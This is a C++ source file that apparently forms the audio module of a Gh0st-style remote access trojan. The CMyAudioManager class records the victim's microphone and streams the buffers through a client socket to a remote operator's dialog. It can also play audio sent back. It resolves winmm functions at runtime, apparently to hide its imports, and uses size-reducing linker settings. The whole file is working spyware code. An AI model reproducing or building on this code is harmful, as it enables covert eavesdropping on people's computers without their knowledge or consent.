// MyAudioManager.cpp: implementation of the CMyAudioManager class.
//
//////////////////////////////////////////////////////////////////////

#include "MyAudioManager.h"

#pragma comment(lib,"msvcrt.lib")
#pragma comment(linker,"/FILEALIGN:0x200 /IGNORE:4078 /OPT:NOWIN98 /nodefaultlib:libcmt.lib")

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////
bool CMyAudioManager::m_bIsWorking = false;

CMyAudioManager::CMyAudioManager(CClientSocket *pClient) : CManager(pClient)
{
	if (!Initialize())
		return;

	BYTE	bToken = TOKEN_AUDIO_START;
	Send(&bToken, 1);
	// Wait for remote dialog open and init
	WaitForDialogOpen();

	m_hWorkThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, (LPVOID)this, 0, NULL);

}

CMyAudioManager::~CMyAudioManager()
{
	m_bIsWorking = false;
	WaitForSingleObject(m_hWorkThread, INFINITE);

	delete	m_lpAudio;
}

DWORD WINAPI CMyAudioManager::WorkThread( LPVOID lparam )
{
	CMyAudioManager *pThis = (CMyAudioManager *)lparam;
	while (pThis->m_bIsWorking)
			pThis->sendRecordBuffer();

	return -1;
}

bool CMyAudioManager::Initialize()
{
	HINSTANCE winmm = LoadLibraryW(L"Winmm.dll");
	
	typedef UINT (WINAPI *WIND)(void); 
	WIND mywaveInGetNumDevs = (WIND)GetProcAddress(winmm, "waveInGetNumDevs");

	if (!mywaveInGetNumDevs())
		return false;

	// 正在使用中.. 防止重复使用
	if (m_bIsWorking)
		return false;

	m_lpAudio = new CAudio;

	m_bIsWorking = true;

	if(winmm) FreeLibrary(winmm);
		
	return true;
}

int CMyAudioManager::sendRecordBuffer()
{
	DWORD	dwBytes = 0;
	UINT	nSendBytes = 0;
	LPBYTE	lpBuffer = m_lpAudio->getRecordBuffer(&dwBytes);
	
	if (lpBuffer == NULL) return 0;
	
	LPBYTE	lpPacket = new BYTE[dwBytes + 1];
	lpPacket[0] = TOKEN_AUDIO_DATA;
	memcpy(lpPacket + 1, lpBuffer, dwBytes);

	if (dwBytes > 0) nSendBytes = Send(lpPacket, dwBytes + 1);
	
	delete	lpPacket;

	return nSendBytes;
}

void CMyAudioManager::OnReceive( LPBYTE lpBuffer, UINT nSize )
{
	if (nSize == 1 && lpBuffer[0] == COMMAND_NEXT)
	{
		NotifyDialogIsOpen();
		return;
	}
	m_lpAudio->playBuffer(lpBuffer, nSize);
}
